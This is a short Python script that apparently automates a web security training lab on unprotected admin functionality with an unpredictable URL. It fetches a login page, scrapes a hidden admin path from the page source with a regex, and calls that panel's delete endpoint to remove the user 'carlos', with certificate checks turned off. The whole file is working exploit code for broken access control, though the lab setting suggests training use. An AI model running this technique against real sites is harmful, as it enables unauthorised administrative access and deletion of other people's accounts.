import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Unprotected admin functionality with unpredictable URL"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the login page\n2. Extract the admin panel path from the source code\n3. Delete carlos from the admin panel\n""")

    print(Fore.WHITE + "[1] Fetching the login page")

    login_page = requests.get(
        f"{url}/login", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE +
          "[2] Extracting the admin panel path from the source code")
    admin_panel_path = re.findall("'(/admin-.*)'", login_page.text)[0]
    print(Fore.GREEN + "hidden path" + Fore.WHITE +
          " => " + Fore.YELLOW + admin_panel_path)

    print(Fore.WHITE + "[3] Deleting carlos from the admin panel")
    session = login_page.cookies.get("session")
    cookies = {"session": session}

    try:
        r = requests.get(
            f"{url}{admin_panel_path}/delete?username=carlos", cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
